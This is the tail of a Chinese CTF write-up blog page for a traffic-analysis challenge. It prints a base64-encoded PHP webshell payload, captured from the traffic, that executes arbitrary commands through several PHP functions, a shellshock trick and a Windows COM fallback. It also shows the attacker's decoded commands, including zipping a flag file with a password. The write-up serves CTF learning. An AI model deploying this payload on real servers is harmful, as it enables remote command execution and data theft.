class="string">&quot;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiNjI1ZmU4Ii4iNjliNDllIjtlY2hvIEBhc2VuYygkb3V0cHV0KTtlY2hvICI2M2MxZGIiLiJmMWU4MTEiO31vYl9zdGFydCgpO3RyeXskcD1iYXNlNjRfZGVjb2RlKHN1YnN0cigkX1BPU1RbIm8xZmFlYmQ0ZWMzZDk3Il0sMikpOyRzPWJhc2U2NF9kZWNvZGUoc3Vic3RyKCRfUE9TVFsiZzQ3OWNmNmYwNThjZjgiXSwyKSk7JGVudnN0cj1AYmFzZTY0X2RlY29kZShzdWJzdHIoJF9QT1NUWyJlNTdmYjljMDY3YzY3NyJdLDIpKTskZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JGM9c3Vic3RyKCRkLDAsMSk9PSIvIj8iLWMgXCJ7JHN9XCIiOiIvYyBcInskc31cIiI7aWYoc3Vic3RyKCRkLDAsMSk9PSIvIil7QHB1dGVudigiUEFUSD0iLmdldGVudigiUEFUSCIpLiI6L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3Ivc2JpbjovdXNyL2Jpbjovc2JpbjovYmluIik7fWVsc2V7QHB1dGVudigiUEFUSD0iLmdldGVudigiUEFUSCIpLiI7QzovV2luZG93cy9zeXN0ZW0zMjtDOi9XaW5kb3dzL1N5c1dPVzY0O0M6L1dpbmRvd3M7QzovV2luZG93cy9TeXN0ZW0zMi9XaW5kb3dzUG93ZXJTaGVsbC92MS4wLzsiKTt9aWYoIWVtcHR5KCRlbnZzdHIpKXskZW52YXJyPWV4cGxvZGUoInx8fGFzbGluZXx8fCIsICRlbnZzdHIpO2ZvcmVhY2goJGVudmFyciBhcyAkdikge2lmICghZW1wdHkoJHYpKSB7QHB1dGVudihzdHJfcmVwbGFjZSgifHx8YXNrZXl8fHwiLCAiPSIsICR2KSk7fX19JHI9InskcH0geyRjfSI7ZnVuY3Rpb24gZmUoJGYpeyRkPWV4cGxvZGUoIiwiLEBpbmlfZ2V0KCJkaXNhYmxlX2Z1bmN0aW9ucyIpKTtpZihlbXB0eSgkZCkpeyRkPWFycmF5KCk7fWVsc2V7JGQ9YXJyYXlfbWFwKCd0cmltJyxhcnJheV9tYXAoJ3N0cnRvbG93ZXInLCRkKSk7fXJldHVybihmdW5jdGlvbl9leGlzdHMoJGYpJiZpc19jYWxsYWJsZSgkZikmJiFpbl9hcnJheSgkZiwkZCkpO307ZnVuY3Rpb24gcnVuc2hlbGxzaG9jaygkZCwgJGMpIHtpZiAoc3Vic3RyKCRkLCAwLCAxKSA9PSAiLyIgJiYgZmUoJ3B1dGVudicpICYmIChmZSgnZXJyb3JfbG9nJykgfHwgZmUoJ21haWwnKSkpIHtpZiAoc3Ryc3RyKHJlYWRsaW5rKCIvYmluL3NoIiksICJiYXNoIikgIT0gRkFMU0UpIHskdG1wID0gdGVtcG5hbShzeXNfZ2V0X3RlbXBfZGlyKCksICdhcycpO3B1dGVudigiUEhQX0xPTD0oKSB7IHg7IH07ICRjID4kdG1wIDI+JjEiKTtpZiAoZmUoJ2Vycm9yX2xvZycpKSB7ZXJyb3JfbG9nKCJhIiwgMSk7fSBlbHNlIHttYWlsKCJhQDEyNy4wLjAuMSIsICIiLCAiIiwgIi1idiIpO319IGVsc2Uge3JldHVybiBGYWxzZTt9JG91dHB1dCA9IEBmaWxlX2dldF9jb250ZW50cygkdG1wKTtAdW5saW5rKCR0bXApO2lmICgkb3V0cHV0ICE9ICIiKSB7cHJpbnQoJG91dHB1dCk7cmV0dXJuIFRydWU7fX1yZXR1cm4gRmFsc2U7fTtmdW5jdGlvbiBydW5jbWQoJGMpeyRyZXQ9MDskZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoZmUoJ3N5c3RlbScpKXtAc3lzdGVtKCRjLCRyZXQpO31lbHNlaWYoZmUoJ3Bhc3N0aHJ1Jykpe0BwYXNzdGhydSgkYywkcmV0KTt9ZWxzZWlmKGZlKCdzaGVsbF9leGVjJykpe3ByaW50KEBzaGVsbF9leGVjKCRjKSk7fWVsc2VpZihmZSgnZXhlYycpKXtAZXhlYygkYywkbywkcmV0KTtwcmludChqb2luKCIKIiwkbykpO31lbHNlaWYoZmUoJ3BvcGVuJykpeyRmcD1AcG9wZW4oJGMsJ3InKTt3aGlsZSghQGZlb2YoJGZwKSl7cHJpbnQoQGZnZXRzKCRmcCwyMDQ4KSk7fUBwY2xvc2UoJGZwKTt9ZWxzZWlmKGZlKCdwcm9jX29wZW4nKSl7JHAgPSBAcHJvY19vcGVuKCRjLCBhcnJheSgxID0+IGFycmF5KCdwaXBlJywgJ3cnKSwgMiA9PiBhcnJheSgncGlwZScsICd3JykpLCAkaW8pO3doaWxlKCFAZmVvZigkaW9bMV0pKXtwcmludChAZmdldHMoJGlvWzFdLDIwNDgpKTt9d2hpbGUoIUBmZW9mKCRpb1syXSkpe3ByaW50KEBmZ2V0cygkaW9bMl0sMjA0OCkpO31AZmNsb3NlKCRpb1sxXSk7QGZjbG9zZSgkaW9bMl0pO0Bwcm9jX2Nsb3NlKCRwKTt9ZWxzZWlmKGZlKCdhbnRzeXN0ZW0nKSl7QGFudHN5c3RlbSgkYyk7fWVsc2VpZihydW5zaGVsbHNob2NrKCRkLCAkYykpIHtyZXR1cm4gJHJldDt9ZWxzZWlmKHN1YnN0cigkZCwwLDEpIT0iLyIgJiYgQGNsYXNzX2V4aXN0cygiQ09NIikpeyR3PW5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTskZT0kdy0+ZXhlYygkYyk7JHNvPSRlLT5TdGRPdXQoKTskcmV0Lj0kc28tPlJlYWRBbGwoKTskc2U9JGUtPlN0ZEVycigpOyRyZXQuPSRzZS0+UmVhZEFsbCgpO3ByaW50KCRyZXQpO31lbHNleyRyZXQgPSAxMjc7fXJldHVybiAkcmV0O307JHJldD1AcnVuY21kKCRyLiIgMj4mMSIpO3ByaW50ICgkcmV0IT0wKT8icmV0PXskcmV0fSI6IiI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0+Z2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs=&quot;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>看到这熟悉格式，直接把<code>g479cf6f058cf8</code>的前两个删去然后base64</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">&quot;/Users/chang/Sites/test&quot;</span>;head -n 2 <span class="string">../flag.txt</span>;<span class="keyword">echo</span> [S];<span class="keyword">pwd</span>;<span class="keyword">echo</span> [E]</span><br></pre></td></tr></table></figure>

<p>就这么试，然后在第20个包里找到了</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">&quot;/Users/chang/Sites/test&quot;</span>;zip -P PaSsZiPWorD flag.zip <span class="string">../flag.txt</span>;<span class="keyword">echo</span> [S];<span class="keyword">pwd</span>;<span class="keyword">echo</span> [E]</span><br></pre></td></tr></table></figure>

<p>flag被压缩了QWQ，还是有密码的</p>
<p>继续分析后面的流量，在最后一个包里看到了一个压缩包文件</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eb327956PK 	  稀匱 <span class="number">3</span>讄X   <span class="built_in">T</span>   </span><br><span class="line">  ../flag.txtUT	 ?LbK6Lbux</span><br><span class="line"> ?     </span><br><span class="line">p=<span class="built_in">T</span>狶鷯<span class="built_in">T</span>?? y鰑胆帥b朘?突D腳&#123;蠥<span class="built_in">t</span>隋僌h?g&lt;O&lt;k&lt;怱???Y塚槧旚輷崉 柙綾?<span class="built_in">T</span>杒懲PK  <span class="number">3</span>讄X   <span class="built_in">T</span>   PK 	  稀匱 <span class="number">3</span>讄X   <span class="built_in">T</span>   </span><br><span class="line">             ../flag.txtUT ?Lbux</span><br><span class="line"> ?     PK      Q   ?    <span class="number">44</span>e71eb66</span><br></pre></td></tr></table></figure>

<p>掐头去尾，扔到winhex里面，然后用密码<code>PaSsZiPWorD</code>解压</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Yes</span>,this is the flag file.</span><br><span class="line"><span class="attribute">And</span> the flag is:</span><br><span class="line"><span class="attribute">DASCTF</span>&#123;f<span class="number">3</span>f<span class="number">32</span>f<span class="number">434</span>eddbc<span class="number">6</span>e<span class="number">6</span>b<span class="number">5043373</span>af<span class="number">95</span>ae<span class="number">8</span>&#125;</span><br></pre></td></tr></table></figure>

<h1 id="其他题解"><a href="#其他题解" class="headerlink" title="其他题解"></a>其他题解</h1><blockquote>
<p>师傅们太厉害了 Orz</p>
</blockquote>
<ul>
<li><h3 id="Crypto题解"><a href="#Crypto题解" class="headerlink" title="Crypto题解"></a><a target="_blank" rel="noopener" href="https://4xwi11.github.io/posts/9171e9d7/">Crypto题解</a></h3></li>
<li><h3 id="部分Pwn题解"><a href="#部分Pwn题解" class="headerlink" title="部分Pwn题解"></a><a target="_blank" rel="noopener" href="https://reurl.cc/0pOVvo">部分Pwn题解</a></h3></li>
<li><h3 id="部分RE题解"><a href="#部分RE题解" class="headerlink" title="部分RE题解"></a><a target="_blank" rel="noopener" href="https://reurl.cc/Gxrzjp">部分RE题解</a></h3></li>
<li><h3 id="部分Misc题解"><a href="#部分Misc题解" class="headerlink" title="部分Misc题解"></a><a target="_blank" rel="noopener" href="https://reurl.cc/Rr15Ae">部分Misc题解</a></h3></li>
<li><h3 id="部分Web题解"><a href="#部分Web题解" class="headerlink" title="部分Web题解"></a><a target="_blank" rel="noopener" href="https://reurl.cc/Gxrzpp">部分Web题解</a></h3></li>
</ul>
<p>（完）</p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>Harry0597
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://harry0597.com/2022/04/24/2022%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9BWP/" title="2022DASCTF Apr X FATE 防疫挑战赛WP">https://harry0597.com/2022/04/24/2022防疫挑战赛WP/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Writeup/" rel="tag"><i class="fa fa-tag"></i> Writeup</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/02/23/%E5%88%9D%E8%AF%86%E5%85%83%E5%AE%87%E5%AE%99/" rel="prev" title="初识元宇宙">
      <i class="fa fa-chevron-left"></i> 初识元宇宙
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/04/29/DES%E7%AE%97%E6%B3%95/" rel="next" title="DES算法">
      DES算法 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    
  <div class="comments">
    <div id="lv-container" data-id="city" data-uid="MTAyMC81NDk1Mi8zMTQyMQ=="></div>
  </div>
  

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%98%9F%E4%BC%8D%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">队伍信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5"><span class="nav-number">2.</span> <span class="nav-text">解题情况</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">2.1.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#special-rsa"><span class="nav-number">2.1.1.</span> <span class="nav-text">special_rsa</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E4%BB%A3%E7%A0%81"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">总代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-real"><span class="nav-number">2.1.2.</span> <span class="nav-text">easy_real</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">题目</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-OF-RSA-%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.1.3.</span> <span class="nav-text">CVE OF RSA | 赛后复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">收获</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">2.2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E5%8D%B7%E8%B0%83%E6%9F%A5"><span class="nav-number">2.2.1.</span> <span class="nav-text">问卷调查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easyflow"><span class="nav-number">2.2.2.</span> <span class="nav-text">easyflow</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E9%A2%98%E8%A7%A3"><span class="nav-number">3.</span> <span class="nav-text">其他题解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Crypto%E9%A2%98%E8%A7%A3"><span class="nav-number">3.0.1.</span> <span class="nav-text">Crypto题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%83%A8%E5%88%86Pwn%E9%A2%98%E8%A7%A3"><span class="nav-number">3.0.2.</span> <span class="nav-text">部分Pwn题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%83%A8%E5%88%86RE%E9%A2%98%E8%A7%A3"><span class="nav-number">3.0.3.</span> <span class="nav-text">部分RE题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%83%A8%E5%88%86Misc%E9%A2%98%E8%A7%A3"><span class="nav-number">3.0.4.</span> <span class="nav-text">部分Misc题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%83%A8%E5%88%86Web%E9%A2%98%E8%A7%A3"><span class="nav-number">3.0.5.</span> <span class="nav-text">部分Web题解</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Harry0597"
      src="/images/IMG_2550.JPG">
  <p class="site-author-name" itemprop="name">Harry0597</p>
  <div class="site-description" itemprop="description">Pondering'll do you wonders.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">24</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
    Chat
  </a>
  </div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="mailto:1915885792@qq.com" title="E-Mail → mailto:1915885792@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>


      
        <script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
        <script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
        <div class="widget-wrap">
          <h3 class="widget-title">Tag Cloud</h3>
          <div id="myCanvasContainer" class="widget tagcloud">
              <canvas width="250" height="250" id="resCanvas" style="width=100%">
                  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CS/" rel="tag">CS</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mac-OS/" rel="tag">Mac OS</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Writeup/" rel="tag">Writeup</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a><span class="tag-list-count">5</span></li></ul>
              </canvas>
          </div>
        </div>
      

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Harry0597</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">470k</span>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>


  <script defer src="/lib/three/three.min.js"></script>
    <script defer src="/lib/three/three-waves.min.js"></script>
    <script defer src="/lib/three/canvas_lines.min.js"></script>
    <script defer src="/lib/three/canvas_sphere.min.js"></script>


  
  <script>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="/js/local-search.js"></script>













  

  

  

<script>
NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
  window.livereOptions = {
    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
  };
  (function(d, s) {
    var j, e = d.getElementsByTagName(s)[0];
    if (typeof LivereTower === 'function') { return; }
    j = d.createElement(s);
    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
    j.async = true;
    e.parentNode.insertBefore(j, e);
  })(document, 'script');
});
</script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
</html>
